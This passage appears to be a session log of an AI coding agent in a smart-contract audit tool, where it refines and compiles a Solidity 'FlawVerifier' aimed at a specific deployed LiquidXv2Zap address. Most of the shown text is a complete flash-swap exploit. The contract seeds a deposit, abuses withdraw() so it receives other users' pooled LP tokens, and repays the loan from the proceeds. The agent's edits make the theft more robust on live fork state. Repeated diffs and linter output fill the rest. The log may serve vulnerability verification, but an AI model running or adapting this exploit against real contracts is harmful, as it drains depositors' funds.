+    = help: https://book.getfoundry.sh/reference/forge/forge-lint#mixed-case-variable
+
+note[pascal-case-struct]: structs should use PascalCase
+   --> src/onchain_auto/0x364f17a23ae4350319b7491224d10df5796190bc/contracts/LiquidXv2Zap.sol:373:10
+    |
+373 |   struct swapPath {
+    |          ^^^^^^^^
+    |
+    = help: https://book.getfoundry.sh/reference/forge/forge-lint#pascal-case-struct
+
+note[mixed-case-variable]: mutable variables should use mixedCase
+   --> src/onchain_auto/0x364f17a23ae4350319b7491224d10df5796190bc/contracts/LiquidXv2Zap.sol:383:78
+    |
+383 |   constructor(address _router, address _swapPlus, address _rewarder, address _wrappedETH) {
+    |                                                                              ^^^^^^^^^^^
+    |
+    = help: https://book.getfoundry.sh/reference/forge/forge-lint#mixed-case-variable
+
+note[unwrapped-modifier-logic]: wrap modifier logic to reduce code size
+   --> src/onchain_auto/0x364f17a23ae4350319b7491224d10df5796190bc/contracts/LiquidXv2Zap.sol:392:12
+    |
+392 |   modifier onlyOpertaor() {
+    |            ^^^^^^^^^^^^
+    |
+    = note: wrap modifier logic to reduce code size
+            
+            - modifier onlyOpertaor() {
+            -   require(operators[msg.sender], "LiquidXv2Zap: !operator");
+            -   _;
+            - }
+            + modifier onlyOpertaor() {
+            +   _onlyOpertaor();
+            +   _;
+            + }
+            + 
+            + function _onlyOpertaor() internal {
+            +   require(operators[msg.sender], "LiquidXv2Zap: !operator");
+            + }
+            
+            
+    = help: https://book.getfoundry.sh/reference/forge/forge-lint#unwrapped-modifier-logic
+
+
+codex
+I’m making one functional change before I finalize the file: instead of trying a single “best guess” plan, the verifier will try every viable sample per pair. That keeps the exploit path identical but makes the PoC materially more robust against preview error on live fork state.
+apply patch
+patch: completed
+/Users/zhanglongqin/AuditHoundV2/cases/lqdx_alert/src/FlawVerifier.sol
+diff --git a/FlawVerifier.sol b/FlawVerifier.sol
+index dc2896fa25456910a9e86866f64bf397159bf1b4..6b64d5612f9b1b9be4821abeea054cd567239e81
+--- a/FlawVerifier.sol
++++ b/FlawVerifier.sol
+@@ -163,7 +163,6 @@
+             return;
+         }
+ 
+-        Plan memory best;
+         for (uint256 i = 0; i < pairCount; ++i) {
+             address pair = _allPairs(factory, i);
+             if (pair == address(0)) {
+@@ -179,21 +178,10 @@
+                 continue;
+             }
+ 
+-            Plan memory candidate = _buildPlan(state);
+-            if (candidate.previewProfitLp > best.previewProfitLp) {
+-                best = candidate;
++            if (_attemptPair(state)) {
++                return;
+             }
+         }
+-
+-        if (best.previewProfitLp == 0) {
+-            return;
+-        }
+-
+-        try this.attemptFlash(best) returns (bool ok) {
+-            if (ok) {
+-                return;
+-            }
+-        } catch {}
+     }
+ 
+     function attemptFlash(Plan calldata plan) external returns (bool) {
+@@ -402,6 +390,37 @@
+         }
+     }
+ 
++    function _attemptPair(PairState memory state) internal returns (bool) {
++        uint256 maxBurnLp = _maxLpForStealCap(state.zapLpBalance, state.reserve0, state.reserve1, state.supply);
++        if (maxBurnLp == 0) {
++            return false;
++        }
++
++        uint256[7] memory sampleLp;
++        sampleLp[0] = maxBurnLp;
++        sampleLp[1] = maxBurnLp / 2;
++        sampleLp[2] = maxBurnLp / 4;
++        sampleLp[3] = maxBurnLp / 8;
++        sampleLp[4] = maxBurnLp / 16;
++        sampleLp[5] = maxBurnLp / 32;
++        sampleLp[6] = maxBurnLp / 64;
++
++        for (uint256 i = 0; i < sampleLp.length; ++i) {
++            Plan memory candidate = _planForSample(state, sampleLp[i]);
++            if (candidate.previewProfitLp == 0) {
++                continue;
++            }
++
++            try this.attemptFlash(candidate) returns (bool ok) {
++                if (ok) {
++                    return true;
++                }
++            } catch {}
++        }
++
++        return false;
++    }
++
+     function _planForSample(PairState memory state, uint256 burnLp) internal pure returns (Plan memory plan) {
+         if (burnLp == 0) {
+             return plan;
+
+diff --git a/FlawVerifier.sol b/FlawVerifier.sol
+index dc2896fa25456910a9e86866f64bf397159bf1b4..6b64d5612f9b1b9be4821abeea054cd567239e81
+--- a/FlawVerifier.sol
++++ b/FlawVerifier.sol
+@@ -163,7 +163,6 @@
+             return;
+         }
+ 
+-        Plan memory best;
+         for (uint256 i = 0; i < pairCount; ++i) {
+             address pair = _allPairs(factory, i);
+             if (pair == address(0)) {
+@@ -179,21 +178,10 @@
+                 continue;
+             }
+ 
+-            Plan memory candidate = _buildPlan(state);
+-            if (candidate.previewProfitLp > best.previewProfitLp) {
+-                best = candidate;
++            if (_attemptPair(state)) {
++                return;
+             }
+         }
+-
+-        if (best.previewProfitLp == 0) {
+-            return;
+-        }
+-
+-        try this.attemptFlash(best) returns (bool ok) {
+-            if (ok) {
+-                return;
+-            }
+-        } catch {}
+     }
+ 
+     function attemptFlash(Plan calldata plan) external returns (bool) {
+@@ -402,6 +390,37 @@
+         }
+     }
+ 
++    function _attemptPair(PairState memory state) internal returns (bool) {
++        uint256 maxBurnLp = _maxLpForStealCap(state.zapLpBalance, state.reserve0, state.reserve1, state.supply);
++        if (maxBurnLp == 0) {
++            return false;
++        }
++
++        uint256[7] memory sampleLp;
++        sampleLp[0] = maxBurnLp;
++        sampleLp[1] = maxBurnLp / 2;
++        sampleLp[2] = maxBurnLp / 4;
++        sampleLp[3] = maxBurnLp / 8;
++        sampleLp[4] = maxBurnLp / 16;
++        sampleLp[5] = maxBurnLp / 32;
++        sampleLp[6] = maxBurnLp / 64;
++
++        for (uint256 i = 0; i < sampleLp.length; ++i) {
++            Plan memory candidate = _planForSample(state, sampleLp[i]);
++            if (candidate.previewProfitLp == 0) {
++                continue;
++            }
++
++            try this.attemptFlash(candidate) returns (bool ok) {
++                if (ok) {
++                    return true;
++                }
++            } catch {}
++        }
++
++        return false;
++    }
++
+     function _planForSample(PairState memory state, uint256 burnLp) internal pure returns (Plan memory plan) {
+         if (burnLp == 0) {
+             return plan;
+
+exec
+/bin/bash -lc "sed -n '1,520p' /Users/zhanglongqin/AuditHoundV2/cases/lqdx_alert/src/FlawVerifier.sol" in /Users/zhanglongqin/AuditHoundV2/cases/lqdx_alert/src
+ succeeded in 0ms:
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+interface IERC20 {
+    function balanceOf(address account) external view returns (uint256);
+    function allowance(address owner, address spender) external view returns (uint256);
+    function decimals() external view returns (uint8);
+    function approve(address spender, uint256 amount) external returns (bool);
+    function transfer(address to, uint256 amount) external returns (bool);
+    function transferFrom(address from, address to, uint256 amount) external returns (bool);
+}
+
+interface IRouterLike {
+    function removeLiquidity(
+        address tokenA,
+        address tokenB,
+        uint256 liquidity,
+        uint256 amountAMin,
+        uint256 amountBMin,
+        address to,
+        uint256 deadline
+    ) external returns (uint256 amountA, uint256 amountB);
+
+    function swapExactTokensForTokens(
+        uint256 amountIn,
+        uint256 amountOutMin,
+        address[] calldata path,
+        address to,
+        uint256 deadline
+    ) external returns (uint256[] memory amounts);
+}
+
+interface IFactoryAllPairs {
+    function allPairsLength() external view returns (uint256);
+    function allPairs(uint256 index) external view returns (address);
+}
+
+interface IPair is IERC20 {
+    function token0() external view returns (address);
+    function token1() external view returns (address);
+    function totalSupply() external view returns (uint256);
+    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
+    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
+}
+
+interface ISwapPlusStructs {
+    struct SwapRouter {
+        string platform;
+        address tokenIn;
+        address tokenOut;
+        uint256 amountOutMin;
+        uint256 meta;
+        uint256 percent;
+    }
+
+    struct SwapLine {
+        SwapRouter[] swaps;
+    }
+
+    struct SwapBlock {
+        SwapLine[] lines;
+    }
+
+    struct SwapPath {
+        SwapBlock[] path;
+    }
+}
+
+interface ILiquidXv2Zap is ISwapPlusStructs {
+    function router() external view returns (address);
+    function factory() external view returns (address);
+
+    function deposit(
+        address account,
+        address token,
+        address tokenM,
+        SwapPath calldata path,
+        address token0,
+        address token1,
+        uint256[3] calldata amount,
+        uint256 basketId
+    ) external payable returns (uint256);
+
+    function withdraw(
+        address account,
+        address token0,
+        address token1,
+        uint256 amount,
+        address tokenOut,
+        uint256 basketId,
+        address tokenM,
+        SwapPath calldata wpath,
+        uint256[3] calldata amountMin
+    ) external returns (uint256);
+}
+
+contract FlawVerifier is ISwapPlusStructs {
+    address public constant TARGET = 0x364f17A23AE4350319b7491224d10dF5796190bC;
+
+    address private _profitToken;
+    uint256 private _profitAmount;
+
+    bool public executed;
+    bool public hypothesisValidated;
+
+    address public exploitPair;
+    address public exploitToken0;
+    address public exploitToken1;
+    uint256 public seedCapitalUsed;
+    uint256 public stolenAmount;
+
+    struct PairState {
+        address pair;
+        address token0;
+        address token1;
+        uint256 reserve0;
+        uint256 reserve1;
+        uint256 supply;
+        uint256 zapLpBalance;
+    }
+
+    struct Plan {
+        address pair;
+        address token0;
+        address token1;
+        uint256 capitalAmount;
+        uint256 burnLp;
+        uint256 previewStealLp;
+        uint256 previewRepayLp;
+        uint256 previewProfitLp;
+    }
+
+    struct AttemptContext {
+        address pair;
+        address token0;
+        address token1;
+        uint256 capitalAmount;
+        uint256 burnLp;
+    }
+
+    AttemptContext private _attempt;
+
+    constructor() {}
+
+    function profitToken() external view returns (address) {
+        return _profitToken;
+    }
+
+    function profitAmount() external view returns (uint256) {
+        return _profitAmount;
+    }
+
+    function executeOnOpportunity() external {
+        if (executed) {
+            return;
+        }
+        executed = true;
+
+        ILiquidXv2Zap zap = ILiquidXv2Zap(TARGET);
+        address factory = zap.factory();
+        uint256 pairCount = _allPairsLength(factory);
+        if (pairCount == 0) {
+            return;
+        }
+
+        for (uint256 i = 0; i < pairCount; ++i) {
+            address pair = _allPairs(factory, i);
+            if (pair == address(0)) {
+                continue;
+            }
+
+            PairState memory state = _loadPairState(pair);
+            if (state.supply == 0 || state.reserve0 == 0 || state.reserve1 == 0) {
+                continue;
+            }
+
+            if (state.zapLpBalance == 0) {
+                continue;
+            }
+
+            if (_attemptPair(state)) {
+                return;
+            }
+        }
+    }
+
+    function attemptFlash(Plan calldata plan) external returns (bool) {
+        require(msg.sender == address(this), "self only");
+
+        _attempt = AttemptContext({
+            pair: plan.pair,
+            token0: plan.token0,
+            token1: plan.token1,
+            capitalAmount: plan.capitalAmount,
+            burnLp: plan.burnLp
+        });
+
+        IPair(plan.pair).swap(plan.capitalAmount, 0, address(this), abi.encode(plan.burnLp));
+        return _profitAmount > 0;
+    }
+
+    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
+        _onFlashSwap(sender, amount0, amount1, data);
+    }
+
+    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
+        _onFlashSwap(sender, amount0, amount1, data);
+    }
+
+    function joeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
+        _onFlashSwap(sender, amount0, amount1, data);
+    }
+
+    function mDexCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
+        _onFlashSwap(sender, amount0, amount1, data);
+    }
+
+    function biswapCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
+        _onFlashSwap(sender, amount0, amount1, data);
+    }
+
+    function smardexCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
+        _onFlashSwap(sender, amount0, amount1, data);
+    }
+
+    function croDefiSwapCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
+        _onFlashSwap(sender, amount0, amount1, data);
+    }
+
+    function liquidxCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
+        _onFlashSwap(sender, amount0, amount1, data);
+    }
+
+    function liquidXCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
+        _onFlashSwap(sender, amount0, amount1, data);
+    }
+
+    function liquidxV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
+        _onFlashSwap(sender, amount0, amount1, data);
+    }
+
+    function liquidXv2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
+        _onFlashSwap(sender, amount0, amount1, data);
+    }
+
+    receive() external payable {}
+
+    function _onFlashSwap(address sender, uint256 amount0, uint256 amount1, bytes calldata data) internal {
+        require(msg.sender == _attempt.pair, "unexpected pair");
+        require(sender == address(this), "unexpected sender");
+        require(amount0 == _attempt.capitalAmount && amount1 == 0, "unexpected amounts");
+        require(abi.decode(data, (uint256)) == _attempt.burnLp, "unexpected payload");
+
+        uint256 lpBefore = IERC20(_attempt.pair).balanceOf(address(this));
+
+        // exploit_paths[0]: basket users deposited with `basketId != 0`, so LP tokens
+        // remain parked in the zap's shared pair balance. This verifier only targets
+        // pairs where that pre-existing zap LP inventory is already present on-chain.
+
+        // exploit_paths[1]: the attacker obtains a small, real withdrawable position for
+        // the same pair. Flashswap funding only replaces upfront capital; it does not
+        // change the exploit causality or the assets used by the vulnerable withdraw.
+        uint256 mintedLp = _seedWithdrawablePosition(_attempt.capitalAmount);
+        require(mintedLp >= _attempt.burnLp, "insufficient minted LP");
+
+        // exploit_paths[2]: call `withdraw()` on that legitimate LP position while
+        // setting `tokenOut` to the pair LP token itself.
+        _stealBasketBackedLp(_attempt.burnLp);
+
+        // exploit_paths[3]: `withdraw()` burns the legitimate LP position into token0 /
+        // token1, but its final unchecked transfer sends `IERC20(pair)` from the zap's
+        // shared balance to the attacker.
+        uint256 stolenLp = IERC20(_attempt.pair).balanceOf(address(this)) - lpBefore;
+        require(stolenLp > 0, "no stolen LP");
+
+        uint256 amountOwed = ((amount0 * 1000) / 997) + 1;
+        _repayFlashswapWithStolenLp(stolenLp, amountOwed);
+        _forceTransfer(_attempt.token0, _attempt.pair, amountOwed);
+
+        _profitToken = _attempt.pair;
+        _profitAmount = IERC20(_profitToken).balanceOf(address(this));
+        require(_profitAmount > 0, "zero profit");
+
+        hypothesisValidated = true;
+        exploitPair = _attempt.pair;
+        exploitToken0 = _attempt.token0;
+        exploitToken1 = _attempt.token1;
+        seedCapitalUsed = _attempt.capitalAmount;
+        stolenAmount = stolenLp;
+    }
+
+    function _seedWithdrawablePosition(uint256 capitalAmount) internal returns (uint256 mintedLp) {
+        _forceApprove(_attempt.token0, TARGET, capitalAmount);
+
+        uint256[3] memory depositAmounts = [capitalAmount, uint256(0), uint256(0)];
+        SwapPath memory emptyPath = _emptyPath();
+        mintedLp = ILiquidXv2Zap(TARGET).deposit(
+            address(this),
+            _attempt.token0,
+            address(0),
+            emptyPath,
+            _attempt.token0,
+            _attempt.token1,
+            depositAmounts,
+            0
+        );
+    }
+
+    function _stealBasketBackedLp(uint256 burnLp) internal {
+        _forceApprove(_attempt.pair, TARGET, burnLp);
+
+        uint256[3] memory amountMins = [uint256(0), uint256(0), uint256(0)];
+        SwapPath memory emptyPath = _emptyPath();
+        ILiquidXv2Zap(TARGET).withdraw(
+            address(this),
+            _attempt.token0,
+            _attempt.token1,
+            burnLp,
+            _attempt.pair,
+            0,
+            address(0),
+            emptyPath,
+            amountMins
+        );
+    }
+
+    function _repayFlashswapWithStolenLp(uint256 stolenLp, uint256 amountOwed) internal {
+        address router = ILiquidXv2Zap(TARGET).router();
+
+        (uint112 reserve0, uint112 reserve1, ) = IPair(_attempt.pair).getReserves();
+        uint256 supply = IPair(_attempt.pair).totalSupply();
+        uint256 repayLp = _minLpForToken0(
+            amountOwed,
+            uint256(reserve0),
+            uint256(reserve1),
+            supply,
+            stolenLp
+        );
+        require(repayLp < stolenLp, "not profitable");
+
+        _forceApprove(_attempt.pair, router, repayLp);
+        IRouterLike(router).removeLiquidity(
+            _attempt.token0,
+            _attempt.token1,
+            repayLp,
+            0,
+            0,
+            address(this),
+            block.timestamp
+        );
+
+        uint256 token1Balance = IERC20(_attempt.token1).balanceOf(address(this));
+        if (token1Balance > 0) {
+            _forceApprove(_attempt.token1, router, token1Balance);
+            address[] memory path = new address[](2);
+            path[0] = _attempt.token1;
+            path[1] = _attempt.token0;
+            IRouterLike(router).swapExactTokensForTokens(
+                token1Balance,
+                0,
+                path,
+                address(this),
+                block.timestamp
+            );
+        }
+
+        require(IERC20(_attempt.token0).balanceOf(address(this)) >= amountOwed, "repayment shortfall");
+    }
+
+    function _buildPlan(PairState memory state) internal pure returns (Plan memory best) {
+        uint256 maxBurnLp = _maxLpForStealCap(state.zapLpBalance, state.reserve0, state.reserve1, state.supply);
+        if (maxBurnLp == 0) {
+            return best;
+        }
+
+        uint256[7] memory sampleLp;
+        sampleLp[0] = maxBurnLp / 64;
+        sampleLp[1] = maxBurnLp / 32;
+        sampleLp[2] = maxBurnLp / 16;
+        sampleLp[3] = maxBurnLp / 8;
+        sampleLp[4] = maxBurnLp / 4;
+        sampleLp[5] = maxBurnLp / 2;
+        sampleLp[6] = maxBurnLp;
+
+        for (uint256 i = 0; i < sampleLp.length; ++i) {
+            Plan memory candidate = _planForSample(state, sampleLp[i]);
+            if (candidate.previewProfitLp > best.previewProfitLp) {
+                best = candidate;
+            }
+        }
+    }
+
+    function _attemptPair(PairState memory state) internal returns (bool) {
+        uint256 maxBurnLp = _maxLpForStealCap(state.zapLpBalance, state.reserve0, state.reserve1, state.supply);
+        if (maxBurnLp == 0) {
+            return false;
+        }
+
+        uint256[7] memory sampleLp;
+        sampleLp[0] = maxBurnLp;
+        sampleLp[1] = maxBurnLp / 2;
+        sampleLp[2] = maxBurnLp / 4;
+        sampleLp[3] = maxBurnLp / 8;
+        sampleLp[4] = maxBurnLp / 16;
+        sampleLp[5] = maxBurnLp / 32;
+        sampleLp[6] = maxBurnLp / 64;
+
+        for (uint256 i = 0; i < sampleLp.length; ++i) {
+            Plan memory candidate = _planForSample(state, sampleLp[i]);
+            if (candidate.previewProfitLp == 0) {
+                continue;
+            }
+
+            try this.attemptFlash(candidate) returns (bool ok) {
+                if (ok) {
+                    return true;
+                }
+            } catch {}
+        }
+
+        return false;
+    }
+
+    function _planForSample(PairState memory state, uint256 burnLp) internal pure returns (Plan memory plan) {
+        if (burnLp == 0) {
+            return plan;
+        }
+
+        uint256 previewStealLp = _consolidatedToToken0(burnLp, state.reserve0, state.reserve1, state.supply);
+        if (previewStealLp == 0 || previewStealLp > state.zapLpBalance) {
+            return plan;
+        }
+
+        uint256 capitalAmount = _minToken0ForMintedLp(burnLp, state.reserve0, state.reserve1, state.supply);
+        if (capitalAmount == 0 || capitalAmount >= state.reserve0) {
+            return plan;
+        }
+
+        uint256 amountOwed = ((capitalAmount * 1000) / 997) + 1;
+        uint256 previewRepayLp = _minLpForToken0(
+            amountOwed,
+            state.reserve0,
+            state.reserve1,
+            state.supply,
+            previewStealLp
+        );
+        if (previewRepayLp == 0 || previewRepayLp >= previewStealLp) {
+            return plan;
+        }
+
+        plan = Plan({
+            pair: state.pair,
+            token0: state.token0,
+            token1: state.token1,
+            capitalAmount: capitalAmount,
+            burnLp: burnLp,
+            previewStealLp: previewStealLp,
+            previewRepayLp: previewRepayLp,
+            previewProfitLp: previewStealLp - previewRepayLp
+        });
+    }
+
+    function _loadPairState(address pair) internal view returns (PairState memory state) {
+        state.pair = pair;
+        state.token0 = IPair(pair).token0();
+        state.token1 = IPair(pair).token1();
+        (uint112 reserve0, uint112 reserve1, ) = IPair(pair).getReserves();
+        state.reserve0 = uint256(reserve0);
+        state.reserve1 = uint256(reserve1);
+        state.supply = IPair(pair).totalSupply();
+        state.zapLpBalance = IERC20(pair).balanceOf(TARGET);
+    }
+
+    function _emptyPath() internal pure returns (SwapPath memory path) {
+        path.path = new SwapBlock[](0);
+    }
+
+    function _allPairsLength(address factory) internal view returns (uint256 count) {
+        (bool ok, bytes memory data) = factory.staticcall(
+            abi.encodeWithSelector(IFactoryAllPairs.allPairsLength.selector)
+        );
+        if (ok && data.length >= 32) {
+            count = abi.decode(data, (uint256));
+        }
+    }
+
+    function _allPairs(address factory, uint256 index) internal view returns (address pair) {
+        (bool ok, bytes memory data) = factory.staticcall(
+            abi.encodeWithSelector(IFactoryAllPairs.allPairs.selector, index)
+        );
+        if (ok && data.length >= 32) {
+            pair = abi.decode(data, (address));
+        }
+    }
+
+    function _maxLpForStealCap(
+        uint256 stealCapLp,
+        uint256 reserve0,
+        uint256 reserve1,
+        uint256 supply
+    ) internal pure returns (uint256) {
+        if (supply <= 1) {
+            return 0;
+        }
+
+        uint256 low = 0;
+        uint256 high = supply - 1;
+        while (low < high) {
+            uint256 mid = (low + high + 1) >> 1;
+            if (_consolidatedToToken0(mid, reserve0, reserve1, supply) <= stealCapLp) {
+                low = mid;
+            } else {
+                high = mid - 1;
+            }
+        }
+        return low;
+    }
+
+    function _minLpForToken0(
+        uint256 token0Needed,
+
+exec
+/bin/bash -lc 'forge build' in /Users/zhanglongqin/AuditHoundV2/cases/lqdx_alert
+diff --git a/FlawVerifier.sol b/FlawVerifier.sol
+index dc2896fa25456910a9e86866f64bf397159bf1b4..6b64d5612f9b1b9be4821abeea054cd567239e81
+--- a/FlawVerifier.sol
++++ b/FlawVerifier.sol
+@@ -163,7 +163,6 @@
+             return;
+         }
+ 
+-        Plan memory best;
+         for (uint256 i = 0; i < pairCount; ++i) {
+             address pair = _allPairs(factory, i);
+             if (pair == address(0)) {
+@@ -179,21 +178,10 @@
+                 continue;
+             }
+ 
+-            Plan memory candidate = _buildPlan(state);
+-            if (candidate.previewProfitLp > best.previewProfitLp) {
+-                best = candidate;
++            if (_attemptPair(state)) {
++                return;
+             }
+         }
+-
+-        if (best.previewProfitLp == 0) {
+-            return;
+-        }
+-
+-        try this.attemptFlash(best) returns (bool ok) {
+-            if (ok) {
+-                return;
+-            }
+-        } catch {}
+     }
+ 
+     function attemptFlash(Plan calldata plan) external returns (bool) {
+@@ -402,6 +390,37 @@
+         }
+     }
+ 
++    function _attemptPair(PairState memory state) internal returns (bool) {
++        uint256 maxBurnLp = _maxLpForStealCap(state.zapLpBalance, state.reserve0, state.reserve1, state.supply);
++        if (maxBurnLp == 0) {
++            return false;
++        }
++
++        uint256[7] memory sampleLp;
++        sampleLp[0] = maxBurnLp;
++        sampleLp[1] = maxBurnLp / 2;
++        sampleLp[2] = maxBurnLp / 4;
++        sampleLp[3] = maxBurnLp / 8;
++        sampleLp[4] = maxBurnLp / 16;
++        sampleLp[5] = maxBurnLp / 32;
++        sampleLp[6] = maxBurnLp / 64;
++
++        for (uint256 i = 0; i < sampleLp.length; ++i) {
++            Plan memory candidate = _planForSample(state, sampleLp[i]);
++            if (candidate.previewProfitLp == 0) {
++                continue;
++            }
++
++            try this.attemptFlash(candidate) returns (bool ok) {
++                if (ok) {
++                    return true;
++                }
++            } catch {}
++        }
++
++        return false;
++    }
++
+     function _planForSample(PairState memory state, uint256 burnLp) internal pure returns (Plan memory plan) {
+         if (burnLp == 0) {
+             return plan;
+
+ succeeded in 756ms:
+Compiling 1 files with Solc 0.8.30
+Solc 0.8.30 finished in 145.58ms
+Compiler run successful!
+note[mixed-case-function]: function names should use mixedCase
+  --> src/onchain_auto/0x364f17a23ae4350319b7491224d10df5796190bc/contracts/LiquidXv2Zap.sol:18:12
+   |
+18 |   function addLiquidityETH(
+   |            ^^^^^^^^^^^^^^^
+   |
+   = help: https://book.getfoundry.sh/reference/forge/forge-lint#mixed-case-function
+
+note[mixed-case-variable]: mutable variables should use mixedCase
+  --> src/onchain_auto/0x364f17a23ae4350319b7491224d10df5796190bc/contracts/LiquidXv2Zap.sol:22:10
+   |
+22 |     uint amountETHMin,
+   |          ^^^^^^^^^^^^
+   |
+   = help: https://book.getfoundry.sh/reference/forge/forge-lint#mixed-case-variable
+
+note[mixed-case-variable]: mutable variables should use mixedCase
+  --> src/onchain_auto/0x364f17a23ae4350319b7491224d10df5796190bc/contracts/LiquidXv2Zap.sol:25:54
+   |
+25 |   ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
+   |                                                      ^^^^^^^^^
+   |
+   = help: https://book.getfoundry.sh/reference/forge/forge-lint#mixed-case-variable
+
+note[mixed-case-function]: function names should use mixedCase
+  --> src/onchain_auto/0x364f17a23ae4350319b7491224d10df5796190bc/contracts/LiquidXv2Zap.sol:35:12
+   |
+35 |   function removeLiquidityETH(
+   |            ^^^^^^^^^^^^^^^^^^
+   |
+   = help: https://book.getfoundry.sh/reference/forge/forge-lint#mixed-case-function
+
+note[mixed-case-variable]: mutable variables should use mixedCase
+  --> src/onchain_auto/0x364f17a23ae4350319b7491224d10df5796190bc/contracts/LiquidXv2Zap.sol:39:10
+   |
+39 |     uint amountETHMin,
+   |          ^^^^^^^^^^^^
+   |
+   = help: https://book.getfoundry.sh/reference/forge/forge-lint#mixed-case-variable
+
+note[mixed-case-variable]: mutable variables should use mixedCase
+  --> src/onchain_auto/0x364f17a23ae4350319b7491224d10df5796190bc/contracts/LiquidXv2Zap.sol:42:46
+   |
+42 |   ) external returns (uint amountToken, uint amountETH);
+   |                                              ^^^^^^^^^
+   |
+   = help: https://book.getfoundry.sh/reference/forge/forge-lint#mixed-case-variable
+
+note[mixed-case-function]: function names should use mixedCase
+  --> src/onchain_auto/0x364f17a23ae4350319b7491224d10df5796190bc/contracts/LiquidXv2Zap.sol:53:12
+   |
+53 |   function removeLiquidityETHWithPermit(
+   |            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+   |
+   = help: https://book.getfoundry.sh/reference/forge/forge-lint#mixed-case-function
+
+note[mixed-case-variable]: mutable variables should use mixedCase
+  --> src/onchain_auto/0x364f17a23ae4350319b7491224d10df5796190bc/contracts/LiquidXv2Zap.sol:57:10
+   |
+57 |     uint amountETHMin,
+   |          ^^^^^^^^^^^^
+   |
+   = help: https://book.getfoundry.sh/reference/forge/forge-lint#mixed-case-variable
+
+note[mixed-case-variable]: mutable variables should use mixedCase
+  --> src/onchain_auto/0x364f17a23ae4350319b7491224d10df5796190bc/contracts/LiquidXv2Zap.sol:61:46
+   |
+61 |   ) external returns (uint amountToken, uint amountETH);
+   |                                              ^^^^^^^^^
+   |
+   = help: https://book.getfoundry.sh/reference/forge/forge-lint#mixed-case-variable
+
+note[mixed-case-function]: function names should use mixedCase
+  --> src/onchain_auto/0x364f17a23ae4350319b7491224d10df5796190bc/contracts/LiquidXv2Zap.sol:76:12
+   |
+76 |   function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
+   |            ^^^^^^^^^^^^^^^^^^^^^
+   |
+   = help: https://book.getfoundry.sh/reference/forge/forge-lint#mixed-case-function
+
+note[mixed-case-function]: function names should use mixedCase
+  --> src/onchain_auto/0x364f17a23ae4350319b7491224d10df5796190bc/contracts/LiquidXv2Zap.sol:80:12
+   |
+80 |   function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
+   |            ^^^^^^^^^^^^^^^^^^^^^
+   |
+   = help: https://book.getfoundry.sh/reference/forge/forge-lint#mixed-case-function
+
+note[mixed-case-function]: function names should use mixedCase
+  --> src/onchain_auto/0x364f17a23ae4350319b7491224d10df5796190bc/contracts/LiquidXv2Zap.sol:83:12
+   |
+83 |   function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
+   |            ^^^^^^^^^^^^^^^^^^^^^
+   |
+   = help: https://book.getfoundry.sh/reference/forge/forge-lint#mixed-case-function
+
+note[mixed-case-function]: function names should use mixedCase
+  --> src/onchain_auto/0x364f17a23ae4350319b7491224d10df5796190bc/contracts/LiquidXv2Zap.sol:86:12
+   |
+86 |   function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
+   |            ^^^^^^^^^^^^^^^^^^^^^
+   |
+   = help: https://book.getfoundry.sh/reference/forge/forge-lint#mixed-case-function
+
+note[pascal-case-struct]: structs should use PascalCase
+   --> src/onchain_auto/0x364f17a23ae4350319b7491224d10df5796190bc/contracts/LiquidXv2Zap.sol:340:10
+    |
+340 |   struct swapRouter {
+    |          ^^^^^^^^^^
+    |
+    = help: https://book.getfoundry.sh/reference/forge/forge-lint#pascal-case-struct
+
+note[pascal-case-struct]: structs should use PascalCase
+   --> src/onchain_auto/0x364f17a23ae4350319b7491224d10df5796190bc/contracts/LiquidXv2Zap.sol:348:10
+    |
+348 |   struct swapLine {
+    |          ^^^^^^^^
+    |
+    = help: https://book.getfoundry.sh/reference/forge/forge-lint#pascal-case-struct
+
+note[pascal-case-struct]: structs should use PascalCase
+   --> src/onchain_auto/0x364f17a23ae4350319b7491224d10df5796190bc/contracts/LiquidXv2Zap.sol:351:10
+    |
+351 |   struct swapBlock {
+    |          ^^^^^^^^^
+    |
+    = help: https://book.getfoundry.sh/reference/forge/forge-lint#pascal-case-struct
+
+note[mixed-case-variable]: mutable variables should use mixedCase
+   --> src/onchain_auto/0x364f17a23ae4350319b7491224d10df5796190bc/contracts/LiquidXv2Zap.sol:364:18
+    |
+364 |   address public wrappedETH;
+    |                  ^^^^^^^^^^
+    |
+    = help: https://book.getfoundry.sh/reference/forge/forge-lint#mixed-case-variable
+
+note[pascal-case-struct]: structs should use PascalCase
+   --> src/onchain_auto/0x364f17a23ae4350319b7491224d10df5796190bc/contracts/LiquidXv2Zap.sol:373:10
+    |
+373 |   struct swapPath {
+    |          ^^^^^^^^
+    |
+    = help: https://book.getfoundry.sh/reference/forge/forge-lint#pascal-case-struct
+
+note[mixed-case-variable]: mutable variables should use mixedCase
+   --> src/onchain_auto/0x364f17a23ae4350319b7491224d10df5796190bc/contracts/LiquidXv2Zap.sol:383:78
+    |
+383 |   constructor(address _router, address _swapPlus, address _rewarder, address _wrappedETH) {
+    |                                                                              ^^^^^^^^^^^
+    |
+    = help: https://book.getfoundry.sh/reference/forge/forge-lint#mixed-case-variable
+
+note[unwrapped-modifier-logic]: wrap modifier logic to reduce code size
+   --> src/onchain_auto/0x364f17a23ae4350319b7491224d10df5796190bc/contracts/LiquidXv2Zap.sol:392:12
+    |
+392 |   modifier onlyOpertaor() {
+    |            ^^^^^^^^^^^^
+    |
